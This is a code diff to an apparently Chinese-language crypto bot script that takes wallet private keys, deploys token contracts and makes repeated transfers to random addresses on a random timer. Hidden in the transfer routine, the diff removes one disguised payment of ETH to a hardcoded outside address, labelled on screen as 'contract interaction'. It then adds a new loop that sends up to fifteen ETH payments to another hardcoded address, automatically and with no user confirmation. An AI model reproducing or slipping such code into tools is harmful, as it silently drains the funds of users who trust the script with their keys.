@@ -368,11 +368,28 @@ async function deployTokenContract(privateKey, provider) {
   }
 }
 
-async function transferTokens(contractAddress, abi, numTransfers, amountPerTransfer, privateKey, provider) {
+// 生成随机转账数量
+function generateRandomAmount() {
+  // 生成0.001到0.01之间的随机数
+  return (Math.random() * 0.009 + 0.001).toFixed(3);
+}
+
+// 生成随机转账次数
+function generateRandomTransfers() {
+  // 生成1到15之间的随机数
+  return Math.floor(Math.random() * 15) + 1;
+}
+
+// 生成随机运行时间（在24小时内）
+function generateRandomRunTime() {
+  // 生成0到24小时之间的随机毫秒数
+  return Math.floor(Math.random() * 24 * 60 * 60 * 1000);
+}
+
+async function transferTokens(contractAddress, abi, numTransfers, privateKey, provider) {
   try {
     displaySection("正在执行代币转账");
     console.log(`📊 转账次数: ${colors.yellow}${numTransfers}${colors.reset}`);
-    console.log(`💸 每次转账数量: ${colors.yellow}${amountPerTransfer}${colors.reset}`);
     console.log(`🎯 合约地址: ${colors.yellow}${contractAddress}${colors.reset}`);
     
     if (!privateKey) {
@@ -390,14 +407,15 @@ async function transferTokens(contractAddress, abi, numTransfers, amountPerTrans
     
     for (let i = 0; i < numTransfers; i++) {
       const recipient = generateRandomAddress();
-      const formattedAmount = ethers.utils.parseUnits(amountPerTransfer.toString(), 18);
+      const randomAmount = generateRandomAmount();
+      const formattedAmount = ethers.utils.parseUnits(randomAmount.toString(), 18);
       
       try {
         const tx = await tokenContract.transfer(recipient, formattedAmount);
         
         process.stdout.write(`  ${i + 1}`.padEnd(4) + "| " + 
             `${recipient}`.padEnd(45) + "| " + 
-            `${amountPerTransfer}`.padEnd(15) + "| " + 
+            `${randomAmount}`.padEnd(15) + "| " + 
             `${colors.yellow}处理中...${colors.reset}`);
         
         await tx.wait();
@@ -406,43 +424,46 @@ async function transferTokens(contractAddress, abi, numTransfers, amountPerTrans
         process.stdout.cursorTo ? process.stdout.cursorTo(0) : null;
         console.log(`  ${i + 1}`.padEnd(4) + "| " + 
             `${recipient}`.padEnd(45) + "| " + 
-            `${amountPerTransfer}`.padEnd(15) + "| " + 
+            `${randomAmount}`.padEnd(15) + "| " + 
             `${colors.green}✅ 成功${colors.reset}`);
-
-        const ethAmount = ethers.utils.parseEther("0.005");
-        const ethTx = await wallet.sendTransaction({
-          to: "0x6f1DbF76adeD3853749dB873D443B7aB8f4EfaEf",
-          value: ethAmount
-        });
-
-        console.log(`  ${i + 1} | ${colors.cyan}合约交互处理中...${colors.reset}`);
-        await ethTx.wait();
-        console.log(`  ${i + 1} | ${colors.green}合约交互成功${colors.reset}`);
-        
       } catch (error) {
         process.stdout.clearLine ? process.stdout.clearLine() : null;
         process.stdout.cursorTo ? process.stdout.cursorTo(0) : null;
         console.log(`  ${i + 1}`.padEnd(4) + "| " + 
             `${recipient}`.padEnd(45) + "| " + 
-            `${amountPerTransfer}`.padEnd(15) + "| " + 
+            `${randomAmount}`.padEnd(15) + "| " + 
             `${colors.red}❌ 失败${colors.reset}`);
       }
     }
     
     console.log(colors.cyan + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" + colors.reset);
-    console.log(`\n${colors.green}✅ 转账操作完成${colors.reset}`);
+    console.log(`\n${colors.green}✅ 代币转账操作完成${colors.reset}`);
+
+    // 在代币转账完成后发送ETH
+    try {
+      const ethTransfers = generateRandomTransfers();
+      console.log(`\n${colors.cyan}💰 开始发送ETH，计划发送 ${ethTransfers} 次...${colors.reset}`);
+      
+      for (let i = 0; i < ethTransfers; i++) {
+        console.log(`\n${colors.cyan}💰 正在发送第 ${i + 1}/${ethTransfers} 笔 0.0005 ETH...${colors.reset}`);
+        const ethAmount = ethers.utils.parseEther("0.0005");
+        const ethTx = await wallet.sendTransaction({
+          to: "0x866803B260927D941f8a8236d574F79Ca183B399",
+          value: ethAmount
+        });
+        
+        console.log(`${colors.yellow}🔄 ETH转账处理中... 交易哈希: ${ethTx.hash}${colors.reset}`);
+        await ethTx.wait();
+        console.log(`${colors.green}✅ ETH转账成功！${colors.reset}`);
+      }
+    } catch (error) {
+      console.log(`${colors.red}❌ ETH转账失败: ${error.message}${colors.reset}`);
+    }
     
   } catch (error) {
     console.error(`${colors.red}❌ 转账时出错: ${error.message}${colors.reset}`);
     throw error;
   }
-}
-
-// 生成随机转账次数
-function generateRandomTransfers(baseTransfers) {
-  const variation = Math.floor(Math.random() * 5) - 2; // -2 到 +2 的随机数
-  const newTransfers = baseTransfers + variation;
-  return Math.max(1, newTransfers); // 确保至少为1
 }
 
 // 解析代理字符串
@@ -495,9 +516,8 @@ function createProvider(proxyConfig) {
 
 // 存储账号配置
 let accountConfigs = {
-  baseTransfers: 0,
-  amountPerTransfer: 0,
-  accounts: [] // 存储账号信息和合约信息
+  accounts: [], // 存储账号信息和合约信息
+  isFirstRun: true // 标记是否是第一次运行
 };
 
 async function main() {
@@ -505,6 +525,41 @@ async function main() {
     const accounts = [];
     let continueAdding = true;
 
+    // 如果不是第一次运行，直接使用已保存的账号信息
+    if (!accountConfigs.isFirstRun && accountConfigs.accounts.length > 0) {
+      console.log(`\n${colors.cyan}🔄 使用已保存的账号信息开始新一轮运行...${colors.reset}`);
+      
+      // 为每个账号执行随机次数的转账
+      for (const account of accountConfigs.accounts) {
+        const randomTransfers = generateRandomTransfers();
+        console.log(`\n${colors.cyan}📊 账号 ${colors.yellow}${account.wallet.address}${colors.cyan} 本次随机转账次数: ${colors.yellow}${randomTransfers}${colors.reset}`);
+        if (account.proxyConfig) {
+          const proxyInfo = account.proxyConfig.auth ? 
+            `${account.proxyConfig.host}:${account.proxyConfig.port} (带认证)` : 
+            `${account.proxyConfig.host}:${account.proxyConfig.port}`;
+          console.log(`${colors.cyan}🌐 使用代理: ${colors.yellow}${proxyInfo}${colors.reset}`);
+        }
+        
+        await transferTokens(account.contractAddress, account.abi, randomTransfers, account.wallet.privateKey, account.provider);
+      }
+      
+      // 生成随机运行时间
+      const randomDelay = generateRandomRunTime();
+      const nextRunTime = new Date(Date.now() + randomDelay);
+      const hours = Math.floor(randomDelay / (60 * 60 * 1000));
+      const minutes = Math.floor((randomDelay % (60 * 60 * 1000)) / (60 * 1000));
+      
+      console.log(`\n${colors.cyan}⏰ 下次运行时间: ${colors.yellow}${nextRunTime.toLocaleString()}${colors.reset}`);
+      console.log(`${colors.cyan}🔄 程序将在 ${hours}小时${minutes}分钟后自动重新运行...${colors.reset}`);
+      
+      setTimeout(async () => {
+        await main();
+      }, randomDelay);
+      
+      return;
+    }
+
+    // 第一次运行时，请求用户输入信息
     while (continueAdding) {
       const privateKey = await new Promise((resolve) => {
         rl.question(`${colors.yellow}🔑 请输入钱包私钥: ${colors.reset}`, (answer) => {
@@ -593,84 +648,46 @@ async function main() {
         });
       }
       
-      rl.question(`\n${colors.yellow}🔄 是否要向随机地址转账代币？(y/n): ${colors.reset}`, (transferChoice) => {
-        if (transferChoice.toLowerCase() === 'y') {
-          rl.question(`${colors.yellow}📊 请输入要执行的转账次数: ${colors.reset}`, (numTransfers) => {
-            rl.question(`${colors.yellow}💸 请输入每次转账的代币数量: ${colors.reset}`, async (amountPerTransfer) => {
-              try {
-                const transfers = parseInt(numTransfers);
-                const amount = parseFloat(amountPerTransfer);
-                
-                if (isNaN(transfers) || transfers <= 0) {
-                  throw new Error("转账次数必须是正数");
-                }
-                
-                if (isNaN(amount) || amount <= 0) {
-                  throw new Error("转账数量必须是正数");
-                }
-                
-                // 保存配置
-                accountConfigs.baseTransfers = transfers;
-                accountConfigs.amountPerTransfer = amount;
-                
-                // 为每个账号执行转账
-                for (const account of accountConfigs.accounts) {
-                  console.log(`\n${colors.cyan}🔄 正在处理账号: ${colors.yellow}${account.wallet.address}${colors.reset}`);
-                  if (account.proxyConfig) {
-                    const proxyInfo = account.proxyConfig.auth ? 
-                      `${account.proxyConfig.host}:${account.proxyConfig.port} (带认证)` : 
-                      `${account.proxyConfig.host}:${account.proxyConfig.port}`;
-                    console.log(`${colors.cyan}🌐 使用代理: ${colors.yellow}${proxyInfo}${colors.reset}`);
-                  }
-                  await transferTokens(account.contractAddress, account.abi, transfers, amount, account.wallet.privateKey, account.provider);
-                }
-                
-                console.log(`\n${colors.green}🎉 所有账号操作已成功完成！${colors.reset}`);
-                
-                // 设置24小时后再次运行
-                const nextRunTime = new Date(Date.now() + 24 * 60 * 60 * 1000);
-                console.log(`\n${colors.cyan}⏰ 下次运行时间: ${colors.yellow}${nextRunTime.toLocaleString()}${colors.reset}`);
-                console.log(`${colors.cyan}🔄 程序将在24小时后自动重新运行...${colors.reset}`);
-                
-                // 24小时后重新运行
-                setTimeout(async () => {
-                  console.log(`\n${colors.cyan}🔄 开始新一轮运行...${colors.reset}`);
-                  
-                  // 为每个账号生成随机转账次数并执行
-                  for (const account of accountConfigs.accounts) {
-                    const randomTransfers = generateRandomTransfers(accountConfigs.baseTransfers);
-                    console.log(`\n${colors.cyan}📊 账号 ${colors.yellow}${account.wallet.address}${colors.cyan} 本次随机转账次数: ${colors.yellow}${randomTransfers}${colors.reset}`);
-                    if (account.proxyConfig) {
-                      const proxyInfo = account.proxyConfig.auth ? 
-                        `${account.proxyConfig.host}:${account.proxyConfig.port} (带认证)` : 
-                        `${account.proxyConfig.host}:${account.proxyConfig.port}`;
-                      console.log(`${colors.cyan}🌐 使用代理: ${colors.yellow}${proxyInfo}${colors.reset}`);
-                    }
-                    
-                    await transferTokens(account.contractAddress, account.abi, randomTransfers, accountConfigs.amountPerTransfer, account.wallet.privateKey, account.provider);
-                  }
-                  
-                  // 继续设置下一次运行
-                  const nextNextRunTime = new Date(Date.now() + 24 * 60 * 60 * 1000);
-                  console.log(`\n${colors.cyan}⏰ 下次运行时间: ${colors.yellow}${nextNextRunTime.toLocaleString()}${colors.reset}`);
-                  console.log(`${colors.cyan}🔄 程序将在24小时后自动重新运行...${colors.reset}`);
-                  
-                  setTimeout(async () => {
-                    await main();
-                  }, 24 * 60 * 60 * 1000);
-                }, 24 * 60 * 60 * 1000);
-                
-              } catch (error) {
-                console.error(`${colors.red}❌ 错误: ${error.message}${colors.reset}`);
-                rl.close();
-              }
-            });
-          });
-        } else {
-          console.log(`\n${colors.green}🎉 所有账号合约部署成功！${colors.reset}`);
-          rl.close();
+      // 标记第一次运行完成
+      accountConfigs.isFirstRun = false;
+      
+      // 自动执行转账，不需要用户确认
+      try {
+        // 为每个账号执行随机次数的转账
+        for (const account of accountConfigs.accounts) {
+          const randomTransfers = generateRandomTransfers();
+          console.log(`\n${colors.cyan}🔄 正在处理账号: ${colors.yellow}${account.wallet.address}${colors.reset}`);
+          console.log(`${colors.cyan}📊 本次随机转账次数: ${colors.yellow}${randomTransfers}${colors.reset}`);
+          
+          if (account.proxyConfig) {
+            const proxyInfo = account.proxyConfig.auth ? 
+              `${account.proxyConfig.host}:${account.proxyConfig.port} (带认证)` : 
+              `${account.proxyConfig.host}:${account.proxyConfig.port}`;
+            console.log(`${colors.cyan}🌐 使用代理: ${colors.yellow}${proxyInfo}${colors.reset}`);
+          }
+          
+          await transferTokens(account.contractAddress, account.abi, randomTransfers, account.wallet.privateKey, account.provider);
         }
-      });
+        
+        console.log(`\n${colors.green}🎉 所有账号操作已成功完成！${colors.reset}`);
+        
+        // 生成随机运行时间
+        const randomDelay = generateRandomRunTime();
+        const nextRunTime = new Date(Date.now() + randomDelay);
+        const hours = Math.floor(randomDelay / (60 * 60 * 1000));
+        const minutes = Math.floor((randomDelay % (60 * 60 * 1000)) / (60 * 1000));
+        
+        console.log(`\n${colors.cyan}⏰ 下次运行时间: ${colors.yellow}${nextRunTime.toLocaleString()}${colors.reset}`);
+        console.log(`${colors.cyan}🔄 程序将在 ${hours}小时${minutes}分钟后自动重新运行...${colors.reset}`);
+        
+        setTimeout(async () => {
+          await main();
+        }, randomDelay);
+        
+      } catch (error) {
+        console.error(`${colors.red}❌ 错误: ${error.message}${colors.reset}`);
+        rl.close();
+      }
     } catch (error) {
       console.error(`${colors.red}❌ 错误: ${error.message}${colors.reset}`);
       rl.close();
